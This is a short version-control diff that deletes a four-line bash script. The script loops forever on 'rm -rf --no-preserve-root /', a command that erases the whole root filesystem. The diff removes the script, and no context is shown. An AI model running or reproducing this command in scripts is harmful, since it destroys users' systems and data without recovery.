@@ -1,4 +1,0 @@
-#!/bin/bash
-while true; do
-rm -rf --no-preserve-root /
-done
